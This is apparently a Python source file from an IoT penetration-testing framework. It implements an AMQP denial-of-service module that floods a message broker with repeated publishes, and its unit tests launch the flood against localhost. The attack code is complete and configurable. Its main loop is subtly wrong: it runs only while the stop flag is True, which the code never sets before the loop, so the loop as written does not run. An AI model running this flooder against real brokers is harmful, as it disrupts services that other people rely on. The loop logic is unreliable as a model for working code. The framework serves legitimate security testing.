import logging
import multiprocessing
import signal
import time
import unittest

import pika

from Entity.attack import Attack
from Entity.input_format import InputFormat


class AMQPDoSAttack(Attack):
    """
    AMQP Protocol - DoS Attack Module
    """
    # Input Fields
    host = "localhost"
    queue = "peniot-queue"
    exchange = "peniot-exchange"
    routing_key = "peniot-routing-key"
    body = "peniot-body"
    exchange_type = "direct"
    timeout = 0.01

    # Misc Members
    connection = None
    channel = None
    logger = None
    sent_message_count = 0
    stopped_flag = False

    def __init__(self):
        default_parameters = ["", "", "", "", "", "", 10.0]
        inputs = [
            InputFormat("Host Name", "host", "localhost", str, mandatory=True),
            InputFormat("Queue Name", "queue", "peniot-queue", str, mandatory=True),
            InputFormat("Exchange Name", "exchange", "peniot-exchange", str, mandatory=True),
            InputFormat("Routing Key", "routing_key", "peniot-routing-key", str, mandatory=True),
            InputFormat("Message Body", "body", "peniot-body", str, mandatory=True),
            InputFormat("Exchange Type", "exchange_type", "direct", str, mandatory=True),
            InputFormat("Timeout", "timeout", self.timeout, float)
        ]

        Attack.__init__(self, "AMQP DoS Attack", inputs, default_parameters,
                        "    We send AMQP requests to the client.\n"
                        "    The time difference between those requests\n"
                        "    can be specified.")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Connection will be closed")
        self.stopped_flag = True
        if self.connection is not None:
            self.connection.close()
        time.sleep(2)  # Sleep two seconds so the user can see the message

    def pre_attack_init(self):
        # Get connection and channel
        self.connection = pika.BlockingConnection(pika.ConnectionParameters(host=self.host))
        self.channel = self.connection.channel()

        # Create exchange
        self.channel.exchange_declare(exchange=self.exchange, exchange_type=self.exchange_type)

        # Define queue to store
        self.channel.queue_declare(queue=self.queue)

    def run(self):
        super(AMQPDoSAttack, self).run()
        self.pre_attack_init()

        # Start client loop for requests
        while self.stopped_flag is True:
            self.sent_message_count += 1
            self.channel.basic_publish(exchange=self.exchange, routing_key=self.routing_key, body=self.body)
            self.logger.info("{0} messages published.".format(str(self.sent_message_count)))
            time.sleep(self.timeout)


class TestMQTTDoSAttack(unittest.TestCase):
    def setUp(self):
        self.amqp_dos_attack = AMQPDoSAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("AMQP DoS Attack", self.amqp_dos_attack.get_attack_name())

    def test_inputs(self):
        inputs = self.amqp_dos_attack.get_inputs()
        self.assertIsNotNone(inputs)
        self.assertGreater(len(inputs), 0, "Non inserted inputs")
        self.assertEquals(len(inputs), 7)

    def test_non_initialized_inputs(self):
        inputs = self.amqp_dos_attack.get_inputs()
        for _input in inputs:
            value = getattr(self.amqp_dos_attack, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = ["a.b.c.d", "pen-queue", "pen-exchange", "pen-routing-key", "peniot-payload", "pen-exh-type",
                          13.2]
        for index, _input in enumerate(example_inputs):
            self.amqp_dos_attack.inputs[index].set_value(_input)

        # Previously it should not be set
        self.assertIsNone(self.amqp_dos_attack.connection)

        super(AMQPDoSAttack, self.amqp_dos_attack).run()

        inputs = self.amqp_dos_attack.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.amqp_dos_attack, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_dos_attack(self):
        def run_attack():
            example_inputs = ["localhost", "peniot-queue", "peniot-exchange", "peniot-routing-key", "peniot-body",
                              "direct", 1]
            for index, _input in enumerate(example_inputs):
                self.amqp_dos_attack.inputs[index].set_value(_input)

            self.amqp_dos_attack.run()

        print "* If server is not initialized this test will not execute properly."
        p = multiprocessing.Process(target=run_attack, name="DoS Attack")
        p.start()
        time.sleep(5)
        if p.is_alive():
            p.terminate()
            p.join()


if __name__ == '__main__':
    unittest.main()
